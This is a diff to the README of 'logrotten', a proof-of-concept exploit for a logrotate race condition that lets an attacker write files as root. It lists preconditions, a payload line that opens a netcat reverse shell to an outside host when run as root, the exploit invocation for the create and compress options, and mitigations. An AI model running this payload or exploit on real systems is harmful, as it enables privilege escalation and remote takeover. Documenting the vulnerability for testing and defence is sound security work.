@@ -2,21 +2,17 @@
 
 ## Brief description
   - logrotate is prone to a race condition after renaming the logfile.
-  - If logrotate is executed as root, with the "create"-option and the user
-    is in control of the logfile path, it is possible to abuse a race-condition 
-    to write files in ANY directories.
+  - If logrotate is executed as root, with option that creates a 
+    file ( like create, copy, compress, etc.) and the user is in control 
+    of the logfile path, it is possible to abuse a race-condition to write 
+    files in ANY directories.
   - An attacker could elevate his privileges by writing reverse-shells into 
     directories like "/etc/bash_completition.d/".
-  - This vulnerability was found during a challenge at the 35c3 CTF 
-    ( https://ctftime.org/event/718 )
-  - A detailed description and a PoC of this challenge was written by the 
-  - nsogroup ( https://blog.nsogroup.com/logrotate-zajebiste-500-points/ )
  
 ## Precondition for privilege escalation
   - Logrotate has to be executed as root
   - The logpath needs to be in control of the attacker
-  - "create" option is set in the logrotate configuration
-    (This exploit might not work without)
+  - Any option that creates files is set in the logrotate configuration
 
 ## Tested version
   - Debian GNU/Linux 9.5 (stretch)
@@ -34,16 +30,26 @@
 echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash myhost 3333 &); fi" > payloadfile
 ```
 
-## Run exploit
+## Run exploit 
+
+If "create"-option is set in logrotate.cfg:
 ```
-nice -n -20 ./logrotten /tmp/log/pwnme.log payloadfile
+nice -n -20 ./logrotten -p ./payloadfile /tmp/log/pwnme.log
 ```
+
+If "compress"-option is set in logrotate.cfg:
+```
+nice -n -20 ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
+```
+
+
 ## Known Problems
-  - It's hard to win the race inside a docker container
+  - It's hard to win the race inside a docker container or on a lvm2-volume
 
 ## Mitigation
   - make sure that logpath is owned by root
-  - or use option "nocreate"
+  - use option "su" in logrotate.cfg
+  - use selinux or apparmor
 
 ## Author
   - Wolfgang Hotwagner
